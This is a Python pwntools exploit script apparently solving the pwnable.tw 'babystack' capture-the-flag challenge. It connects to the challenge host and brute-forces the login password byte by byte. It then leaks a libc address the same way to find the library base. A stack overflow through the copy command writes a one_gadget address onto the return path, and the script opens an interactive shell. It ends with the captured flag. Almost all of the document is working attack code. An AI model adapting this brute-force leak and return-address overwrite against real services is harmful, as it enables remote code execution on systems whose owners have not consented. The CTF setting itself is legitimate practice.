from pwn import *
debug = 1
if debug:
	s = process('./babystack')
	raw_input('debug')
	setvbuf_offset = 0x6fe70
else:
	s = remote('chall.pwnable.tw', 10205)
	e = ELF('libc_64.so.6')
	setvbuf_offset = e.symbols['setvbuf']

# main : 0x0000555555554ECF
'''
idea of this stuff like the way we leak canary of bufferoverflow 3 of picoCTF2019
'''
def login(passwd,brute=0):
# cmp pass: 0x0000555555554DEF
	if brute:
		s.sendafter('>> ','1'*8)
	else:
		s.sendafter('>> ','1'*16)
	s.sendafter('Your passowrd :',passwd)

def logout():
# cmp pass: 0x0000555555554DEF
	s.sendafter('>> ','1'*8)

def copy(data):
# 0x555555554e76
	s.sendafter('>> ','3'*16)
	s.sendafter('Copy :',data)

def exit():
	s.sendafter('>> ','2'*16)
	

# login('\x00'+(0x7e*'a'))
# copy('b'*0x30)


# brute pass
passs = ''
for n in range(0,16):
	for i in range(0x1,0xff+1):
		login(passs+chr(i)+'\x00',1)
		ret = s.recvline()
		print ret
		if 'Login Success !' in ret:
			passs+=chr(i)
			logout()
			break
log.info('your pass: %s',passs)
login(passs)
logout()

#brute libc address
login('\x00'+(0x57*'a')) # enough to reach setvbuf in stack
copy('b'*0x30) 
logout()
setvbuf_libc=''
payload = 0x10*'a'+0x8*'1'
for n in range(0,6):
	for i in range(0x1,0xff+1):
		login(payload+chr(i)+'\x00',1)
		ret = s.recvline()
		print ret
		if 'Login Success !' in ret:
			payload+=chr(i)
			setvbuf_libc+=chr(i)
			logout()
			break
setvbuf_libc = u64(setvbuf_libc.ljust(8,'\x00'))-324
log.info("setbuf_libc address: 0x%x",setvbuf_libc)
base_libc = setvbuf_libc - setvbuf_offset
log.info("base_libc address: 0x%x",base_libc)	

# call shell
pop_rax_ret = 0x0000000000033544 + base_libc
xor_rax_rax = 0x000000000008ad15 + base_libc
one_gadget = 0x45216 +base_libc # rax = null
# copy one_gadget to stack first
login('\x00'+'a'*0x3f+passs+0x18*'a'+ p64(one_gadget))
copy('c'*0x30)

exit()
s.interactive()
s.close()
# FLAG{Its_juS7_a_st4ck0v3rfl0w}